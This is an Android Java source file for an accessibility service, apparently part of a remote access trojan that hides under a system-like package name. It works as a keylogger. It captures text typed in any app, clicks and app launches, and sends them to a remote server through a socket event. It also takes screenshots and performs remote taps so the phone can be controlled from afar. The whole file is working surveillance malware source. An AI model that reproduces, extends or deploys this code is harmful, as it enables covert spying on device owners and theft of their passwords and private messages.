package com.sys.service.manager;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.view.Display;
import androidx.annotation.RequiresApi;
import java.util.concurrent.Executors;
import android.os.Handler;
import android.os.Looper;

/**
 * Remote Control and Screen Capture via Accessibility Service
 */
public class RemoteControlService extends AccessibilityService {

    private static RemoteControlService instance = null;
    private StringBuilder keyloggerBuffer = new StringBuilder();
    private Handler debounceHandler = new Handler(Looper.getMainLooper());
    private Runnable sendRunnable;
    private String lastPackageName = "";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.e("RemoteControl", "Accessibility Service Connected!");
    }

    public static RemoteControlService getInstance() {
        return instance;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Desconocido";

        try {
            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        StringBuilder sb = new StringBuilder();
                        for (CharSequence cs : event.getText()) {
                            sb.append(cs);
                        }
                        String typedText = sb.toString().trim();
                        if (!typedText.isEmpty() && !typedText.equals("[]")) {
                            sendKeylog("[" + packageName + "] TYPED: " + typedText);
                        }
                    }
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    CharSequence desc = event.getContentDescription();
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        sendKeylog("[" + packageName + "] CLICKED: " + event.getText().get(0));
                    } else if (desc != null && desc.length() > 0) {
                        sendKeylog("[" + packageName + "] CLICKED: " + desc);
                    }
                    break;
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    sendKeylog("ABRIO APP: " + packageName);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendKeylog(String logText) {
        if (!logText.contains("ABRIO APP") && !logText.contains("CLICKED")) {
            // It's a TYPED event
            if (!lastPackageName.equals(logText.split("]", 2)[0])) {
               flushBuffer();
               lastPackageName = logText.split("]", 2)[0];
            }
            
            // Extract the actual typed text
            String textContent = logText.contains("TYPED:") ? logText.substring(logText.indexOf("TYPED:") + 6).trim() : logText;
            keyloggerBuffer.setLength(0); // Clear and set the new full word since accessibility provides whole text blocks
            keyloggerBuffer.append("[").append(lastPackageName.replace("[", "")).append("] TYPED: ").append(textContent);

            if (sendRunnable != null) {
                debounceHandler.removeCallbacks(sendRunnable);
            }
            
            sendRunnable = new Runnable() {
                @Override
                public void run() {
                    flushBuffer();
                }
            };
            // Send after 1500ms of typing inactivity
            debounceHandler.postDelayed(sendRunnable, 1500);

        } else {
             // Immediate events (clicks, app opens)
             flushBuffer();
             emitToServer(logText);
        }
    }

    private void flushBuffer() {
        if (keyloggerBuffer.length() > 0) {
            emitToServer(keyloggerBuffer.toString());
            keyloggerBuffer.setLength(0);
        }
    }

    private void emitToServer(String logText) {
        try {
            org.json.JSONObject data = new org.json.JSONObject();
            data.put("log", logText);
            
            // Solo intentamos enviar si el socket está inicializado
            if(IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                 IOSocket.getInstance().getIoSocket().emit("x0000kl", data);
            }
        } catch (Exception e) {
            // Log error silently
        }
    }

    @Override
    public void onInterrupt() {
    }

    // Modern Screenshot (Android 11+)
    @RequiresApi(api = Build.VERSION_CODES.R)
    public void takeScreenCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
                    if (bitmap != null) {
                        Log.e("ScreenManager", "Screenshot captured successfully!");
                        // Since hardware buffer might need software conversion for JPEG
                        Bitmap softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                        ScreenManager.sendScreenshot(softwareBitmap);
                    }
                }

                @Override
                public void onFailure(int i) {
                    Log.e("ScreenManager", "Screenshot capture failed: " + i);
                }
            });
        }
    }

    // Remote Click Action
    public void performClick(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 10));
            dispatchGesture(builder.build(), null, null);
        }
    }
}
